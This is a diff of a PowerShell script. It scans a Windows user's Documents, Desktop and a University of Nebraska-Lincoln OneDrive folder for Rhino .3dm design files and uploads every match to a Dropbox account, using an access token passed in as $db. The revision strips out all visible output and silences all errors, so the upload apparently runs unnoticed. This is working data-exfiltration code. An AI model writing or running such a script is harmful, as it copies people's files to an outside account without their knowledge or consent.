@@ -1,67 +1,54 @@
-# Force TLS 1.2 for secure connection
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# Target locations
-$folders = @(
+# Dropbox configuration
+$accessToken = $db
+$localFolders = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-# Dropbox API setup
-$headers = @{
-    "Authorization" = "Bearer $db"
-    "Content-Type" = "application/json"
-}
+# API endpoints
+$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
+$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
 
 # Create computer-specific folder
-$computer = $env:COMPUTERNAME
-$folderArg = @{path="/$computer"; autorename=$true} | ConvertTo-Json
+$computerName = $env:COMPUTERNAME
+$headers = @{
+    "Authorization" = "Bearer $accessToken"
+    "Content-Type" = "application/json"
+}
+$body = @{
+    "path" = "/$computerName"
+    "autorename" = $true
+} | ConvertTo-Json
+
 try {
-    $null = Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderArg
+    Invoke-RestMethod -Uri $dropboxCreateFolderUrl -Method Post -Headers $headers -Body $body | Out-Null
 } catch {
-    Write-Host "Folder exists or connection failed"
+    # Folder likely already exists
 }
 
-# File upload function
-function Upload-File {
-    param($file)
-    $uploadHeaders = $headers.Clone()
-    $uploadHeaders["Content-Type"] = "application/octet-stream"
-    $uploadArgs = @{
-        path = "/$computer/$($file.Name)"
-        mode = "add"
-        autorename = $true
-    } | ConvertTo-Json -Compress
-    
-    $uploadHeaders.Add("Dropbox-API-Arg", $uploadArgs)
-    
-    try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
-        $null = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $uploadHeaders -Body $fileBytes
-        Write-Host "[✓] Uploaded: $($file.Name)" -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "[X] Failed: $($file.Name)" -ForegroundColor Red
-        return $false
+# Upload files
+$headers["Content-Type"] = "application/octet-stream"
+foreach ($folder in $localFolders) {
+    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        $relativePath = $_.FullName.Replace($folder, '').TrimStart('\')
+        $dropboxFilePath = "$computerName/$relativePath".Replace('\', '/')
+        
+        $headers["Dropbox-API-Arg"] = @{
+            "path" = "/$dropboxFilePath"
+            "mode" = "add"
+            "autorename" = $true
+            "mute" = $false
+        } | ConvertTo-Json -Compress
+        
+        try {
+            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
+            $null = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
+        } catch {
+            # Silent error handling
+        }
     }
 }
 
-# Main execution
-Write-Host "Starting 3DM file scan..." -ForegroundColor Yellow
-$count = 0
-
-foreach ($folder in $folders) {
-    Write-Host "`nScanning: $folder" -ForegroundColor Cyan
-    $files = Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue
-    
-    foreach ($file in $files) {
-        $count++
-        Write-Host "Found: $($file.FullName)" -ForegroundColor Gray
-        Upload-File -file $file | Out-Null
-    }
-}
-
-Write-Host "`nOperation complete! Files processed: $count" -ForegroundColor Yellow
-Write-Host "Window will close in 30 seconds..." -ForegroundColor Gray
+# Keep window open for debugging (remove in production)
 Start-Sleep -Seconds 30
